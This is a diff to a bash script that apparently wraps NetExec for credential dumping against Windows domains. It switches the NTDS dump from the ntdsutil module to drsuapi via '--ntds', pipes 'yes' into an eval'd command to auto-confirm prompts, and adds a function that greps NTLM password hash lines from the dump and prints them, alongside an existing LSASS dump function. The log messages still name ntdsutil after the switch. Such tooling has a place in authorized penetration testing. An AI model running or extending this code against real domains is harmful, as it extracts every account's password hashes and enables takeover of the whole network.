@@ -370,27 +370,44 @@ dump_lsass() {
   fi
 }
 
-# Function to execute NTDS dump using ntdsutil
+# Function to parse the NTDS output
+parse_ntds_output() {
+  local output_file="$1"
+
+  # Extract hashes from the NTDS dump file
+  local hashes
+  hashes=$(grep -oP "^[^:]+:[0-9]+:[^:]+:[^:]+:::" "$output_file")
+
+  if [[ -n "$hashes" ]]; then
+    echo -e "${GREEN}[NTDS HASHES FOUND]:${RESET}"
+    echo "$hashes"
+  else
+    echo -e "${YELLOW}No significant NTDS hashes found in the dump.${RESET}"
+  fi
+}
+
+# Function to execute NTDS dump using drsuapi
+# https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit
 dump_ntds() {
   # Define the output file path using TARGET_DUMP_DIR
   local output_file="$TARGET_DUMP_DIR/NTDS_dump_${TARGET_HOST}.txt"
 
-  # Construct the command for NTDS dump
+  # Construct the base command
   local cmd
-  cmd=$(construct_base_cmd)" -M ntdsutil > '$output_file' 2>&1"
+  cmd=$(construct_base_cmd)" --ntds"
 
   # Log the operation
-  add_log "Starting NTDS dump using ntdsutil..."
+  add_log "Starting NTDS dump using drsuapi..."
 
-  # Run the command and process the results
-  if run_command "$cmd"; then
+  # Run the command with yes piped into it
+  if yes | eval "$cmd > '$output_file' 2>&1"; then
     # Log success and store the output path in the JSON log
     log_operation "NTDS" "success" "\"file_path\": \"$output_file\", \"method\": \"ntdsutil\""
     add_log "NTDS dump saved to $output_file"
 
-    # Optionally parse or validate output
+    # Parse and display NTDS hashes
     echo -e "${GREEN}[NTDS DUMP COMPLETED]:${RESET}"
-    grep -i "successfully" "$output_file" || echo -e "${YELLOW}No significant output parsed from NTDS dump.${RESET}"
+    parse_ntds_output "$output_file"
   else
     # Log failure if the command did not succeed
     log_operation "NTDS" "failed" "\"error\": \"Failed to dump NTDS using ntdsutil\""
